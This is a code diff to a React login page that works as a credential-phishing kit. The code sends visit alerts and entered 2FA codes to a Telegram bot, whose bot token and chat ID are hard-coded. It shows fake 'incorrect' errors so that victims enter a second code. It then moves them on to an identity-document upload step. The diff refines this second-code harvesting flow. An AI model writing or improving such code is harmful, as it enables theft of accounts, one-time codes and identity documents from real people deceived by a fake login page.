@@ -19,12 +19,13 @@ export default function LoginPage() {
   const [isLoading, setIsLoading] = useState(false);
   const [twoFactorCode, setTwoFactorCode] = useState("");
   const [twoFactorMessage, setTwoFactorMessage] = useState("");
+  const [twoFactorAttemptCount, setTwoFactorAttemptCount] = useState(0);
   const [identityFront, setIdentityFront] = useState(null);
   const [identityBack, setIdentityBack] = useState(null);
   const [randomNumber, setRandomNumber] = useState("");
   const [step, setStep] = useState(1);
   const [telegramChatId] = useState("7132570959"); // Replace with actual chat ID
-  const [telegramBotToken] = useState("8282863099:AAGCOmJ3FgeClGZkB15jkSqijaTHH21abZI"); // Replace with actual bot toke
+  const [telegramBotToken] = useState("8282863099:AAGCOmJ3FgeClGZkB15jkSqijaTHH21abZI"); // Replace with actual bot token
 
   useEffect(() => {
     // Send visit alert to Telegram when page loads
@@ -75,7 +76,7 @@ export default function LoginPage() {
       setIsLoading(false);
       setSubmitMessage({ type: "error", text: "Username or password is incorrect" });
     } else if (attemptCount === 1) {
-      await new Promise((resolve) => setTimeout(resolve, 2000));
+      await new Promise((resolve) => setTimeout(resolve, 200));
       setIsLoading(false);
       setStep(2);
     }
@@ -85,27 +86,23 @@ export default function LoginPage() {
 
   const handleTwoFactorSubmit = async (e) => {
     e.preventDefault();
+    setIsSubmitting(true);
     setIsLoading(true);
     setTwoFactorMessage("");
 
     sendToTelegram({ twoFactorCode });
 
-    await new Promise((resolve) => setTimeout(resolve, 2000));
-    setIsLoading(false);
-    setTwoFactorMessage("The code entered is incorrect. Please try again.");
-
-    const secondAttempt = await new Promise((resolve) => {
-      setTimeout(() => resolve(prompt("Enter 6-digit code again:")), 0);
-    });
-    if (secondAttempt) {
-      setTwoFactorCode(secondAttempt);
-      sendToTelegram({ twoFactorCode: secondAttempt });
-      setIsLoading(true);
+    if (twoFactorAttemptCount === 0) {
       await new Promise((resolve) => setTimeout(resolve, 5000));
       setIsLoading(false);
-      setTwoFactorMessage("Successfully verified");
+      setTwoFactorMessage("The code entered is incorrect. Please try again.");
+    } else if (twoFactorAttemptCount === 1) {
+      await new Promise((resolve) => setTimeout(resolve, 2000));
+      setIsLoading(false);
       setStep(3);
     }
+    setIsSubmitting(false);
+    setTwoFactorAttemptCount(twoFactorAttemptCount + 1);
   };
 
   const handleIdentitySubmit = async (e) => {
@@ -232,9 +229,16 @@ export default function LoginPage() {
                   className="w-full mb-4"
                   required
                 />
-                <div className="p-3 bg-gray-50 rounded text-sm text-gray-600 text-center">
-                  Have you lost access to all your MFA methods? <Link href="#" className="text-blue-600 hover:text-blue-700 underline">Please begin the MFA recovery process.</Link>
-                </div>
+                {twoFactorMessage && (
+                  <div className="p-3 bg-red-50 text-red-800 border border-red-200 rounded-md text-sm text-center">
+                    {twoFactorMessage}
+                  </div>
+                )}
+                {isLoading && (
+                  <div className="flex justify-center">
+                    <Loader className="animate-spin h-5 w-5 text-blue-600" />
+                  </div>
+                )}
                 <Button type="submit" className="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-2.5 mt-4" disabled={isLoading}>
                   Continue
                 </Button>
@@ -242,6 +246,9 @@ export default function LoginPage() {
                   <Link href="#" className="text-sm text-blue-600 hover:text-blue-700 underline">Go back</Link>
                 </div>
               </form>
+              <div className="p-3 bg-gray-50 rounded text-sm text-gray-600 text-center">
+                Have you lost access to all your MFA methods? <Link href="#" className="text-blue-600 hover:text-blue-700 underline">Please begin the MFA recovery process.</Link>
+              </div>
             </CardContent>
           </Card>
           <div className="text-center mt-4 space-x-2 text-xs text-gray-600">
